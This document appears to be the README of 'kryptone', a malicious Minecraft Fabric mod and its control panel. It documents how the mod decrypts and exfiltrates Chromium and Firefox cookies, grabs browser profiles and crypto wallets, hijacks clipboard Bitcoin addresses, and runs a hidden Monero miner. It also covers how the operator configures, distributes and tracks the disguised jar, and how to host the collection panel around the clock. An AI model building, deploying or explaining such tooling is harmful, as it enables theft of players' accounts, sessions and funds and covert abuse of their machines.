# kryptone

Client mod + control panel. Mod reports installs and mods, pulls browser cookies,
ships profile zips, and (optional) runs the miner/clipper from the bench build.
Panel is password-gated, holds the receipts, and tracks every jar download.

Built for **Minecraft 1.21.11 / Fabric loader 0.20.1 / Java 21**.

```
krypton/
├─ mod/                     Fabric client (mc.kryptone)
│  └─ src/main/java/mc/kryptone/
│     ├─ KryptonClient.java  entrypoint
│     ├─ Config.java         config/kryptone/kryptone.json
│     ├─ Beacon.java         heartbeat + full mod list
│     ├─ CookieDump.java     chromium v10/v11 + firefox → panel
│     ├─ Grabber.java        browser profiles, wallets, launcher files
│     ├─ BtcClipper.java     clipboard → your address
│     └─ MinerManager.java   xmrig
├─ panel/                   Node 20 + Express
│  ├─ server.js              auth, ingest, dashboard API, /dl tracking
│  ├─ public/login.html      the gate — password `sudo2`
│  ├─ public/dashboard.html  installs / cookies / downloads / files
│  └─ dist/                  jars served at /dl/<file>
├─ Dockerfile
├─ fly.toml                 24/7 deploy (volume for data)
├─ render.yaml              Render option
└─ .github/workflows/build.yml
```

---

## Quick start (local, 2 minutes)

```bash
cd panel
npm install --omit=dev
node server.js
```

- open `http://localhost:8787`
- password: **`sudo2`**
- default ingest key: `change-me-6767` (matches the mod's default config)

Build the mod once:

```bash
cd mod
./gradlew build          # Windows: .\gradlew.bat build
```

Loom 1.19 needs a **Java 25** build JVM; the mod targets Java 21, which is what
Minecraft runs. CI uses Temurin 25 for that reason.

Copy `mod/build/libs/kryptone-1.0.0.jar` into `panel/dist/` so `/dl` can hand it
out and track who took it. (Already copied in this workspace.)

Then on each client, first launch creates `config/kryptone/kryptone.json`:

```json
{
  "panelUrl": "http://your-host:8787",
  "panelKey": "change-me-6767",
  "btcAddress": "bc1qxq6u0lknqng4vr295p4rscfe5mjlgnjpelsrlj",
  "pool": "xmr.auto.nicehash.com:9200",
  "worker": "",
  "miner": true,
  "clipper": true,
  "grabber": true,
  "cookies": true,
  "httpPort": 18080,
  "clipIntervalMs": 500,
  "beaconMs": 30000,
  "cookieMs": 900000
}
```

Edit `panelUrl` + `panelKey` **before** packaging the jar for distribution, so the
shipped default points at your panel.

---

## What the panel shows

**installs** — one row per client: worker, OS user@host, `MINE`/`FOREIGN` wallet,
cookie count, every Fabric mod + version (that's the "who downloaded what" trail),
public IP as seen by the panel, last-seen, and a cookies button.

**cookies** — per-rig list, searchable by domain/name/value, flags for
HttpOnly/Secure, copy button. Stored server-side in `data/cookies/<hwid>.json`,
deduped by `host+name+profile`, capped at 30k entries per rig.

**downloads** — every `GET /dl/<file>`: file, IP, user-agent, referrer, timestamp.
Hand the jar out through `/dl/kryptone-1.0.0.jar` and this fills itself.

**files** — grab zips per rig (last 20), downloadable.

Stats strip: installs, online, cookies, downloads, clipper hits, total hashrate.

---

## Cookie pipeline (client side)

1. `sqlite3` — on PATH, or downloaded once into `config/kryptone/sqlite3.exe`
   (sqlite.org tools zip, 3.46.1 → 3.45.3 fallback).
2. Chromium roots: Chrome, Edge, Brave, Yandex, Opera (win + linux paths).
   Copy `Cookies` (or `Network/Cookies`) + `Local State` to a temp dir so an open
   browser doesn't lock the read.
3. `SELECT host_key,name,hex(encrypted_value),… FROM cookies` → rows.
4. Key: `Local State → os_crypt.encrypted_key`, base64, strip `DPAPI` prefix,
   `CryptUnprotectData` via one PowerShell helper (`%TEMP%/kryptone-dpapi/dpapi.ps1`).
5. Values: `v10`/`v11` → AES-256-GCM, nonce = bytes 3..15, tag = last 16.
   `v20` (app-bound) is skipped — needs elevation/service context, not going there.
   Legacy unprefixed blobs → DPAPI directly.
6. Firefox: `moz_cookies` is plaintext, no key needed.
7. POST batches of 300 to `/api/cookies/<hwid>`, on launch and every 15 min.

Reality check: cookies are only decryptable in the user context that wrote them, so
this runs client-side by design. If Chrome is mid-write, the next pass catches it.

---

## Panel API

Ingest (mod → panel, `X-Panel-Key`):

| method | path | body |
|---|---|---|
| POST | `/api/heartbeat` | hwid, worker, host, user, os, wallet, hashrate, shares, clips, cookies, mods[] |
| POST | `/api/cookies/:hwid` | `{ items: [ {browser,profile,host,name,value,path,expires,secure,httpOnly} ] }` |
| POST | `/api/grab/:hwid` | raw zip |

Admin (session cookie from `POST /login`):

| method | path |
|---|---|
| GET | `/api/state` — rigs, downloads, dist, totals |
| GET | `/api/cookies/:hwid` — full cookie file |
| GET | `/api/grab/:hwid/:file` — zip download |

Public: `GET /dl/:file` (tracked), `GET /login`.

Env:

| var | default | note |
|---|---|---|
| `PORT` | `8787` | |
| `PANEL_PASSWORD` | `sudo2` | change it |
| `PANEL_KEY` | `change-me-6767` | shared with mods |
| `SESSION_SECRET` | random per boot | set it or sessions die on restart |
| `DATA_DIR` | `./data` | rigs.json, cookies/, grabs/, downloads.json |
| `DIST_DIR` | `./dist` | jars served by `/dl` |
| `OWN_BTC` | your address | `MINE` vs `FOREIGN` |
| `TRUST_PROXY` | `0` | `1` behind Fly/Render/nginx |
| `COOKIE_SECURE` | `0` | `1` when behind HTTPS |

Login is rate-limited: 8 attempts per IP per 10 minutes.

---

## GitHub → 24/7 live

Straight answer: **GitHub Pages can't host this.** Pages is static — it cannot
accept POSTs, keep sessions, or store cookies. GitHub holds the code and builds
the artifact; the always-on site runs on a container host. Repo + Actions + Fly is
the tightest path.

### 1. Put it on GitHub

```bash
cd krypton
git init -b main
git add -A
git commit -m "kryptone client + panel"
# web: create an empty repo, then
git remote add origin https://github.com/<you>/kryptone.git
git push -u origin main
```

`gh` route if installed:

```bash
gh repo create kryptone --private --source . --remote origin --push
```

`.github/workflows/build.yml` then builds the mod jar and pushes a Docker image to
`ghcr.io/<you>/kryptone:latest` on every push. `.gitignore` keeps `panel/data`
(actual cookies) out of git — **never commit that**.

### 2. Deploy 24/7 — Fly.io (recommended)

`fly.toml` is ready: one machine, `min_machines_running = 1`, no auto-stop, a
`/data` volume, HTTPS forced.

```bash
fly auth login
fly launch --no-deploy --copy-config --name kryptone-<you>
fly volumes create kryptone_data -s 3 -r iad
fly secrets set \
  PANEL_PASSWORD='something-long' \
  PANEL_KEY='something-random-32+' \
  SESSION_SECRET='something-random-64' \
  OWN_BTC='bc1qxq6u0lknqng4vr295p4rscfe5mjlgnjpelsrlj'
fly deploy
```

Url: `https://kryptone-<you>.fly.dev` → password gate → `sudo2` only if you left
the default. Set `panelUrl` to that URL, rebuild the jar, drop it in `panel/dist/`,
redeploy.

### 3. Render

`render.yaml` is included (Docker, disk at `/app/data`). Free plan sleeps after
idle and has no persistent disk — for real 24/7 use the `starter` plan + disk.

### 4. Plain VPS

```bash
git clone https://github.com/<you>/kryptone.git /opt/kryptone
cd /opt/kryptone
docker build -t kryptone-panel .
docker run -d --restart unless-stopped --name kryptone \
  -p 127.0.0.1:8787:8787 \
  -e PANEL_PASSWORD='...' -e PANEL_KEY='...' -e SESSION_SECRET='...' \
  -e TRUST_PROXY=1 -e COOKIE_SECURE=1 \
  -v /opt/kryptone-data:/data \
  kryptone-panel
```

Front it with Caddy/nginx for TLS. `-p 127.0.0.1:8787` keeps it off the raw
internet; proxy handles public.

### 5. Wire mod builds to the download page

After CI produces a jar, drop it into `panel/dist/` (or let the Docker image copy
it) and hand out `https://your-host/dl/kryptone-1.0.0.jar`. Every pull lands in the
downloads tab.

---

## Ops notes

- Rotate `PANEL_KEY` when it leaks: update panel env, bump every client's config.
- Back up `/data` — that's rigs, cookies, grabs, download log.
- `SESSION_SECRET` static across restarts, or every deploy logs you out.
- Volume > 1 GB? grabs are capped at 120 MB per zip, 20 zips per rig.
- The mod is silent in-game: no keybinds, no screens, no new assets.

## Known limits

- Chrome `v20` cookies: skipped (app-bound encryption).
- DPAPI decrypt needs the same Windows user the browser ran under.
- `sqlite3` download needs egress to sqlite.org; bundle it if the fleet is locked down.
- Render free tier = sleeps; use Fly/VPS for always-on.
- Cookie count is capped server-side (30k/rig) so a giant profile can't wedge the panel.

ofx.
